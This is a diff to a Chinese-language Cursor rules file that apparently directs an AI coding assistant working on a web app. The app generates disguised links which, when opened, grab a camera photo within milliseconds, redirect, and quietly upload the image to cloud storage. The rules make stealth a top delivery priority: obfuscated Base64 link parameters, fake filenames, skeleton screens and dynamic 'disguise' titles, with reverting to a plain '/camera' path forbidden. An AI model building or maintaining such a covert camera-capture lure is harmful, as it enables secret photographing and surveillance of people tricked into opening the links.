@@ -26,12 +26,10 @@ alwaysApply: true
 
 ### 部署脚本
 
-- [scripts/deploy-production.bat](mdc:scripts/deploy-production.bat) - Windows
-  部署到 production 分支
-- [scripts/deploy-production.sh](mdc:scripts/deploy-production.sh) - Linux/Mac
-  部署到 production 分支
-- [scripts/deploy.bat](mdc:scripts/deploy.bat) - Windows 完整部署脚本
-- [scripts/deploy.sh](mdc:scripts/deploy.sh) - Linux/Mac 完整部署脚本
+- [scripts/deploy-main.bat](mdc:scripts/deploy-main.bat) - Windows 部署到 main 分支（生产环境）
+- [scripts/deploy-main.sh](mdc:scripts/deploy-main.sh) - Linux/Mac 部署到 main 分支（生产环境）
+- [scripts/deploy.bat](mdc:scripts/deploy.bat) - Windows 完整部署脚本（首次部署）
+- [scripts/deploy.sh](mdc:scripts/deploy.sh) - Linux/Mac 完整部署脚本（首次部署）
 
 ### 静态资源
 
@@ -44,12 +42,14 @@ alwaysApply: true
 - **存储**: Cloudflare R2 (对象存储)
 - **托管**: Cloudflare Pages (静态托管)
 - **API**: RESTful API
+- **包管理器**: pnpm
+- **部署工具**: Wrangler CLI
 
 ## 🔗 部署环境
 
-- **Production 分支**: 绑定自定义域名
-- **Main 分支**: 用于预览和测试
-- **Worker API**: 独立部署在 workers.dev 域名
+- **Main 分支**: 唯一生产分支，绑定自定义域名 `https://zk9999902.dpdns.org`
+- **Worker API**: 独立部署在 workers.dev 域名，通过 `pnpm exec wrangler deploy` 部署
+- **包管理**: 使用 pnpm（见 `pnpm-lock.yaml`）
 
 ## 📊 核心功能特性
 
@@ -77,11 +77,90 @@ https://domain/v?d=Base64编码参数
              └─────── 伪装文件名
 ```
 
+## 🎯 开发核心原则
+
+### 最小化改动原则（奥卡姆剃刀法则）
+
+**核心思想**：以最简洁有效的方式解决问题，避免过度设计。
+
+**实施准则**：
+1. **简洁优先**：短小而精悍，杜绝过度设计
+2. **精准定位**：每次改动仅针对当前最可能的问题点，禁止跳跃式假设
+3. **先验证再改动**：通过测试和日志确认问题点，避免盲目修改
+4. **渐进式优化**：优先解决核心问题，次要优化可后续迭代
+
+**代码实践示例**：
+
+```javascript
+// ❌ 过度设计
+class PhotoManager {
+  constructor() {
+    this.cache = new Map();
+    this.queue = [];
+    this.observers = [];
+  }
+  // ... 100+ 行代码
+}
+
+// ✅ 简洁有效
+function uploadPhoto(photo) {
+  return fetch(API_CONFIG.UPLOAD, {
+    method: "POST",
+    body: JSON.stringify({ id, image: photo }),
+  });
+}
+```
+
+### 交付优先级（按重要性排序）
+
+1. **性能**：保持 0ms 链接生成、10ms 拍照、先跳转后上传；维持 JPEG 0.7、分页加载等优化
+2. **隐蔽性**：链接使用 `/v?d=`、骨架屏、动态标题等伪装策略；严禁回退到 `/camera` 前缀或明文参数
+3. **可靠性**：所有异步操作补齐错误处理与降级逻辑，兼容旧链接参数格式
+4. **安全性**：执行输入校验、XSS 防护、HTTPS 与 CORS 规范
+5. **体验一致性**：仅使用自定义 Toast/Confirm，不得调用浏览器原生弹窗；沿用既定 UI 组件样式
+
+## 🔧 实现规范概览
+
+### URL 与参数
+- 生成链接必须合并参数为 `id|url` 后使用 `btoa(unescape(encodeURIComponent(...)))`
+- 解析时反向解码并保留旧格式兼容
+- 详见 [url-encoding.mdc](mdc:.cursor/rules/url-encoding.mdc)
+
+### API 调用
+- 严格通过 `window.API_CONFIG` 访问 `UPLOAD`/`PHOTOS`
+- 为请求附加 `Content-Type: application/json`，并捕获 `fetch` 异常
+- 详见 [api-config.mdc](mdc:.cursor/rules/api-config.mdc)
+
+### 摄像头流程
+- 等待 `canplay`/流就绪后再拍照
+- 调用 `stream.getTracks().forEach(track => track.stop())` 释放资源
+- 上传请求设置 `keepalive:true` 防止跳转中断
+- 详见 [performance-security.mdc](mdc:.cursor/rules/performance-security.mdc)
+
+### UI 行为
+- 依照基准 `.container`、`button`、响应式断点等样式
+- 预加载 `config.js` 并保留 DNS 预解析标签
+- 详见 [ui-components.mdc](mdc:.cursor/rules/ui-components.mdc)
+
+### Worker 逻辑
+- 维持 `/api/upload|photos|ping` 的现有行为、CORS 头
+- R2 键命名：`id/timestamp.png`
+- 分页实现；新增接口需同步更新 `config.js`
+
 ## ⚠️ 重要约定
 
 1. **保持根目录整洁**: 不要在根目录添加新的 HTML/JS 文件
 2. **脚本统一管理**: 所有部署/工具脚本放在 `scripts/` 目录
 3. **API 地址配置**: 通过 [config.js](mdc:config.js) 统一管理
-4. **部署到自定义域名**: 必须使用 `--branch=production`
+4. **部署到生产环境**: 使用 `--branch=main` 部署到自定义域名
 5. **新链接使用 /v**: 不再生成 /camera 链接，但保留兼容性
 6. **不使用短链接**: 直接生成原始链接，速度更快更可靠
+
+## 🚫 禁止事项
+
+- 创建新的根级 HTML/JS 或引入第三方短链接服务
+- 在生产逻辑中使用 `alert`/`confirm`/`prompt` 或阻塞式操作
+- 弃用 `keepalive`、改用同步上传、或移除骨架屏/伪装标题
+- 提交带有硬编码 API、未关闭的流、或缺少错误处理的代码
+- 嵌套层级超过 3 层，单个函数超过 50 行（复杂逻辑除外）
+- 忽略控制台警告和错误
